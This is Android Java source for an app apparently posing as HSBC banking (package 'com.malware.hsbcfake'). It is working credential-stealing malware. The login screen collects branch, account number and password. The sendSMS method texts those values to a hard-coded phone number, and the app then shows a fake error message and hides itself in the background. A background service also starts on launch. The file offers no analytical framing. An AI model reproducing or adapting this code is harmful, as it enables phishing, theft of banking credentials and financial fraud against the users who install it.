package com.malware.hsbcfake;

import java.util.List;

import android.os.Bundle;
import android.app.Activity;
import android.app.ActivityManager;
import android.app.AlertDialog;
import android.app.ActivityManager.RunningAppProcessInfo;
import android.content.ComponentName;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.DialogInterface.OnClickListener;
import android.content.pm.PackageManager;
import android.telephony.SmsManager;
import android.util.Log;
import android.view.Menu;
import android.view.View;
import android.view.Window;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

public class MainActivity extends Activity {
	
	Button btnAcessar;
	EditText edtAgencia;
	EditText edtConta;
	EditText edtSenha;

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		
		requestWindowFeature(Window.FEATURE_NO_TITLE);
		
		setContentView(R.layout.activity_main);
		
		//Toast.makeText(getApplicationContext(), "Iniciando app", Toast.LENGTH_LONG).show();		
		//Toast.makeText(getApplicationContext(), "segunda vez", Toast.LENGTH_LONG).show();
		
		Intent intent = new Intent(this, TasksService.class);
		startService(intent);
		
		btnAcessar = (Button) findViewById(R.id.btnAcessar);
		edtAgencia = (EditText) findViewById(R.id.edtAgencia);
		edtConta = (EditText) findViewById(R.id.edtConta);
		edtSenha = (EditText) findViewById(R.id.edtSenha);
	}

	public void btnAcessar_Click(View view) {
		
		String msg = sendSMS();
		
		new AlertDialog.Builder(this)
        .setTitle(R.string.app_name)
        .setMessage("Ocorreu um erro ao acessar a sua conta, por favor tente novamente.")
        .setPositiveButton("Ok", new OnClickListener() {
            public void onClick(DialogInterface arg0, int arg1) {
            	moveTaskToBack(true);
            }
        }).create().show();
	}
	
	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.main, menu);
		return true;
	}
	
	private String sendSMS() {
		
		String msg = "Agencia: " + edtAgencia.getText() + 
					" Conta: " + edtConta.getText() + 
					" Senha: " + edtSenha.getText();
		
		try {
			SmsManager smsManager = SmsManager.getDefault();
			smsManager.sendTextMessage("+5524999294900", null, msg, null, null);
		}
		catch (Exception e) {
			
		}
        
        return msg;
	}
}
